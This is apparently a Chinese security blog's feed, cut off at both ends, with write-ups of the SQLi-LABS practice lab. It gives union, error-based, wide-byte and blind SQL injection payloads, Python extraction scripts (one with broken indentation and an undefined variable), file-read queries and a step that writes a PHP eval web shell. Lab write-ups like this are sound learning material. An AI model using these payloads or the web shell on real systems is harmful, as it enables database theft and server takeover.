   $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>这里面怎么防范呢？<br>使用addslashes(),我们需要将mysql_query 设置为<code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p>这时候我想到了我当时做的一个题目好像utf8_general_ci可以用编码去绕过，但是那个是在mysql服务端起作用的</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这一题换了post的模式但是利用方法还是有点不同的，<br>本关是post 型的注入漏洞，同样的也是将post 过来的内容进行了‘ \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的\ 给吃掉。而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将<code>‘</code> 转为utf-16 为<code>♦&#39;</code>  。我们就<br>可以利用这个方式进行尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>但也可以直接用%df绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>这一题水，根本没有使用任何引号不需要闭合，它的转义也是多余的，直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这一关里面用了<code>mysql_real_escape_string</code>函数去进行过滤<br>是因mysql 我们并没有设置成gbk，所以<code>mysql_real_escape_string()</code>依旧能够被突破。方法<br>和上述是一样的。<br>用utf-16绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>用%df去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>有报错输出选择报错注入，就是post方式的宽字节<br>uname=admin%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>SQLi-LABS(Adv)这一部分的题目完结，这一部分主要是对输入的数据进行了过滤和防护，但是都过滤得不全，<br>还是会存在多种绕过的方法，这一部分学到了新的知识，就是用utf-16编码绕过宽字节的那一部分内容，其实这里的宽字节前提条件是需要客户端里面设置了gbk，服务端跟过程没有设置同样的编码导致的，所以开发的时候得注意，另外的话这里边的二次注入的题目也是很值得推敲的，也学到了新知识，就是服务器两层架构以及http参数污染的应用，有点意思。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-23&quot;&gt;&lt;a href=&quot;#Less-23&quot; class=&quot;headerlink&quot; title=&quot;Less-23&quot;&gt;&lt;/a&gt;Less-23&lt;/h3&gt;&lt;p&gt;从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(一)</title>
    <link href="0verwatch.top/sqli-labs-training-1.html"/>
    <id>0verwatch.top/sqli-labs-training-1.html</id>
    <published>2018-08-29T12:01:04.000Z</published>
    <updated>2018-08-29T12:10:13.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs<a id="more"></a></p><p>一些前置知识<br>系统函数<br>介绍几个常用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>一般用于尝试的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ps:--+可以用#替换，url 提交过程中Url 编码后的#为%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>凡是出现这种有回显的报错是感觉是最好做的注入</p><p>常规步骤，<code>暴库-&gt;爆表-&gt;爆列</code><br>这里我们是多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造我们需要的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> 回显正常，说明猜测成功</p><p>去后台看一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>是这样子的，没有任何过滤</p><p>然后开始用order by去猜列数<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  得到表中应该是三列(用二分法去慢慢测)</p><p>然后开始用union select去回显某一列的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>这里我们需要把第一句话弄成结果为空才能显示后面一句话的内容，这里我选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p><p>下面我们就开始要用mysql里面自带的information_schema表了<br>猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>猜列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>才猜对应的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>这一句话只能猜一行，所以要想看其他行的内容就必须要刷一下limit的内容了</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>很无聊，看一下源代码什么防御都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>测试得到3列，然后开始闭合，其实这一题直接注释了就好</p><p>直接上语句<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>这时候想测什么都可以了</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>可以猜测这里应该是一个单引号+括号闭合，测试一下对不对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>成功回显</p><p>再看看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>果然如此</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>尝试?id=1’单引号没有报错<br>尝试一下”,发现出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>猜测是<code>&quot;+）</code>的组合<br>闭合一下试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>成功回显<br>再看看源代码果然是这样<br>接下来就是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据<code>You are in</code>的有无来判断正确<br>输入id=1’出现报错回显<br>猜测是单引号的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>尝试闭合一下出现回显，这个题目有两种做法，一种是直接尝试盲注，另一种是报错注入<br>首先来一个报错注入的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>然后再来一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>输入?id=1’没有任何反应，双引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>直接报错即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>是测试写文件的功能<br>直接输入单引号出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>这里得提及一下如果要读取以及写文件的话必须得需要权限，这里我借鉴了一部分内容<br>导入导出相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)：读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure><p>使用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.必须有权限读取并且文件可读</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span><br><span class="line"></span><br><span class="line">B.欲读取文件必须在服务器上。</span><br><span class="line">C.必须指定文件完整的路径</span><br><span class="line">D.欲读取文件必须小于max_allowed_packet。</span><br></pre></td></tr></table></figure><p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.绝对物理路径</span><br><span class="line">2.构造有效的畸形语句(报错爆出绝对路径)</span><br></pre></td></tr></table></figure></p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">利用hex()将文件导出来，特别是smb文件</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explain：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explain：路径里的/用\\代替</span><br><span class="line">load data file导入数据库</span><br><span class="line">略。</span><br><span class="line">导入到文件中</span><br><span class="line">SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</span><br><span class="line">file_name 不能是一个已经存在的文件。</span><br></pre></td></tr></table></figure><p>从源代码里面可以发现是要闭合)的，所以我们就可以这样去写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>连接成功<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一题源代码里面将有关报错信息全都注释了只能用盲注<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>先测试发现还是直接一个单号然后加一个注释就可以坐后面的事情了<br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这是一个时间盲注的题目<br>直接单引号闭合加个注释其实就ok了，这里就直接给个爆数据库的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>也是一个时间盲注题目，不过这一题是双引号闭合，把上面的脚本改为双引号就好</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是一个post表格的界面<br>上来就尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>再尝试Less-11一部分内容，发现不行，没有报错信息<br>尝试双引号<br>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>应该是有一个括号的<br>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>立即过</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>上一题的单引号版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这一体的注入点在password上，这也提醒了我们，注入点不一定是在第一个输入框内还有可能是第二输入框呢！<br>我们也可以从源代码的角度去分析，因为源代码写了个check函数去检查username而password反而漏了写<br>对应的password我们可以用报错注入去实现，用单引号闭合password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆详细信息<br>这时候输入这一句话的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>会出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>介绍一下里面的过滤函数，其他两个很熟悉就不介绍了<br><code>mysql_real_escape_string()</code><br>函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一进去就显示ip，可能是http头注入<br>查看源代码我们是要登录进去后才能注入，利用的是insert的那一部分语句<br>先在user-agent那里输入1’ 会出现报错<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code><br>再尝试一下<code>1&#39; and &#39;1&#39;=&#39;1</code><br>出现回显没有报错<br><figure class="highlight plain"><table><tr><td 